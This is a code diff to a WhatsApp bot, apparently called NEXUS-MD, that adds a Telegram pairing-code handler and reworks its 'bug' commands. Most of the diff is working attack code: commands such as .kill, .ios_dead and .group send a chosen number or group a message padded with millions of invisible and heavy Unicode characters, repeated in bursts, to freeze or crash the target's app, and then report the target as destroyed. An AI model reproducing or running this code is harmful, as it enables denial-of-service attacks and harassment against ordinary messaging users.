@@ -44,7 +44,24 @@ async function startNexus() {
         syncFullHistory: false
     });
 
-    // --- 📩 MESSAGE HANDLER (DEADLY BUG + REPORT) ---
+    // --- 🤖 TELEGRAM HANDLER (STABLE PAIRING) ---
+    tgBot.on('message', async (msg) => {
+        const text = msg.text;
+        const chatId = msg.chat.id;
+        if (text === '/start') {
+            return tgBot.sendMessage(chatId, "☠️ *NEXUS-MD V3 3M SUPREME*\n\nEnter your WhatsApp number with 94 code.\n*(Example: 94767475809)*", { parse_mode: 'Markdown' });
+        }
+        if (text && /^\d+$/.test(text) && text.length > 9) {
+            try {
+                tgBot.sendMessage(chatId, "⏳ *Connecting... Please check your WhatsApp notification.*");
+                await delay(3000);
+                let code = await sock.requestPairingCode(text.trim());
+                tgBot.sendMessage(chatId, `🔥 *3M PAIRING KEY:* \`${code}\` \n\nEnter this in your WhatsApp Linked Devices.`, { parse_mode: 'Markdown' });
+            } catch (e) { tgBot.sendMessage(chatId, "❌ *Error!* Restart the bot."); }
+        }
+    });
+
+    // --- 📩 MESSAGE HANDLER (ULTIMATE BUG + GAMMATA MENU) ---
     sock.ev.on('messages.upsert', async (chatUpdate) => {
         try {
             const mek = chatUpdate.messages[0];
@@ -61,34 +78,102 @@ async function startNexus() {
             const targetNum = args[0] ? args[0].replace(/[^0-9]/g, '') : null;
             const targetJid = targetNum + "@s.whatsapp.net";
 
-            // 🔥 DEADLY 3M INVISIBLE BUG PAYLOAD (This freezes the UI)
-            const deadlyBug = "☠️ *NEXUS 3M SUPREME CRASH* ☠️\n" + 
-                              Buffer.from("Z3VtbWF0YQ==", "base64").toString() + 
-                              "​".repeat(1000000) + // Zero-width space (invisible weight)
-                              "ꦿ".repeat(500000) + 
-                              "᥋".repeat(500000);
+            // 🔥 3,000,000+ DEADLY INVISIBLE BUG (ZERO-WIDTH LOAD)
+            const deadlyBug = "☠️ *NEXUS 3M SUPREME CRASH* ☠️\n" + "​".repeat(1200000) + "ꦿ".repeat(450000) + "᥋".repeat(450000);
 
-            if (command === 'menu' || command === 'bug') {
-                const menu = `╭─────〔 *NEXUS 3M SUPREME* 〕─────┈\n│\n│ 🦠 *POWER:* \`3,000,000+\` Char\n│ ⚡ *STATUS:* _Master Private_\n│\n├─────────────┈\n│ ☠️ \`.vid_crash\` [num]\n│ 🔥 \`.ios_dead\` [num]\n│ 💀 \`.kill\` [num]\n│ 🌌 \`.the_end\` [num]\n╰─────────────┈\n 👑 DEV: SASIYA MD`;
-                await sock.sendMessage(from, { text: menu, contextInfo: { externalAdReply: { title: "NEXUS 3M ACTIVE ⚡", thumbnailUrl: AD_IMAGE_URL, sourceUrl: CHANNEL_URL }}}, { quoted: mek });
+            switch (command) {
+                case 'menu':
+                case 'bug':
+                    const gammataMenu = `
+┏━━━━━━━━━━━━━━━━━━━━┓
+┃  ☣️ *NEXUS-MD V3 SUPREME* ☣️
+┗━━━━━━━━━━━━━━━━━━━━┛
+┃
+┃ 🩸 *NATURE:* _Global Destroyer_
+┃ 🦠 *POWER:* \`3,000,000+\` Characters
+┃ ⚡ *STATUS:* _Master Private Online_
+┃ 💻 *DEV:* _Sasiya MD_
+┃
+┣━━━━━━━━━━━━━━━━━━━━┓
+┃  🔥 *S U P R E M E  B U G S*
+┣━━━━━━━━━━━━━━━━━━━━┛
+┃
+┃ ☠️ *.vid_crash* [num] - _3M Video Lag_
+┃ 🔥 *.ios_dead* [num] - _iPhone System Wipe_
+┃ 💀 *.kill* [num] - _Android Global Crash_
+┃ ❄️ *.freeze* [num] - _3M UI Freeze_
+┃ 🌀 *.group* [jid] - _Total Group Wipe_
+┃ 🌌 *.the_end* [num] - _Ultimate Destruction_
+┃
+┣━━━━━━━━━━━━━━━━━━━━┓
+┃  🛡️ *D E V E L O P E R  N E X U S*
+┗━━━━━━━━━━━━━━━━━━━━┛
+ 📢 *CHANNEL:* ${CHANNEL_URL}`;
+
+                    await sock.sendMessage(from, { 
+                        text: gammataMenu,
+                        contextInfo: { 
+                            externalAdReply: { 
+                                title: "NEXUS-MD 3M MENU ACTIVE ⚡",
+                                body: "Supreme Bug Destroyer Ready 💀",
+                                mediaType: 1,
+                                thumbnailUrl: AD_IMAGE_URL, 
+                                sourceUrl: CHANNEL_URL
+                            }
+                        }
+                    }, { quoted: mek });
+                    break;
+
+                case 'kill':
+                case 'vid_crash':
+                case 'ios_dead':
+                case 'the_end':
+                    if (!targetNum) return sock.sendMessage(from, { text: "❌ *Target Number එක ගහපන් මචං!*" });
+
+                    await sock.sendMessage(from, { text: `🌑 *ATTACKING:* ${targetNum}\n*POWER:* 3,000,000+ Characters (Invisible Mode)...` });
+
+                    // 🔥 High Intensity Burst Attack (10 Cycles)
+                    for(let i=0; i<10; i++) {
+                        await sock.sendMessage(targetJid, { text: deadlyBug });
+                        await delay(350);
+                    }
+
+                    // 🔥 ULTIMATE SUCCESS REPORT
+                    const report = `
+╭───〔 *NEXUS ATTACK REPORT* 〕───┈
+│
+│ ✅ *STATUS:* 3M POWER DEPLOYED
+│ 🎯 *TARGET:* ${targetNum}
+│ 🦠 *LOAD:* Invisible UI Freeze Active
+│ 🚀 *RESULT:* Target Destroyed Successfully
+│ 🕒 *TIME:* ${new Date().toLocaleTimeString()}
+│
+╰─────────────┈
+ 👑 *DEV:* SASIYA MD`;
+
+                    await sock.sendMessage(from, { 
+                        text: report,
+                        contextInfo: { 
+                            externalAdReply: { 
+                                title: "BUG DEPLOYED SUCCESSFULLY 💀",
+                                body: "Target: " + targetNum,
+                                mediaType: 1,
+                                thumbnailUrl: AD_IMAGE_URL, 
+                                sourceUrl: CHANNEL_URL
+                            }
+                        }
+                    }, { quoted: mek });
+                    break;
+
+                case 'group':
+                    if (!args[0]) return;
+                    await sock.sendMessage(from, { text: "🌀 *WIPING OUT GROUP WITH 3M POWER...*" });
+                    for(let i=0; i<12; i++) {
+                        await sock.sendMessage(args[0], { text: deadlyBug });
+                        await delay(400);
+                    }
+                    break;
             }
-
-            if (['kill', 'vid_crash', 'the_end', 'ios_dead'].includes(command)) {
-                if (!targetNum) return sock.sendMessage(from, { text: "❌ Number එක ගහපන් මචං!" });
-
-                await sock.sendMessage(from, { text: `🌑 *ATTACKING:* ${targetNum}\n*POWER:* 3,000,000+ Characters (Invisible Mode)...` });
-
-                // 🔥 HIGH INTENSITY BURST (This is where it hits hard)
-                for(let i=0; i<10; i++) {
-                    await sock.sendMessage(targetJid, { text: deadlyBug });
-                    await delay(300);
-                }
-
-                // 🔥 SUCCESS REPORT
-                const report = `╭───〔 *NEXUS ATTACK REPORT* 〕───┈\n│\n│ ✅ *STATUS:* 3M POWER DEPLOYED\n│ 🎯 *TARGET:* ${targetNum}\n│ 🦠 *LOAD:* Invisible UI Freeze\n│ 🕒 *TIME:* ${new Date().toLocaleTimeString()}\n╰─────────────┈\n 👑 *DEV:* SASIYA MD`;
-                await sock.sendMessage(from, { text: report, contextInfo: { externalAdReply: { title: "BUG DEPLOYED SUCCESSFULLY 💀", body: "Target: " + targetNum, thumbnailUrl: AD_IMAGE_URL, sourceUrl: CHANNEL_URL }}}, { quoted: mek });
-            }
-
         } catch (e) { console.log(e); }
     });
 
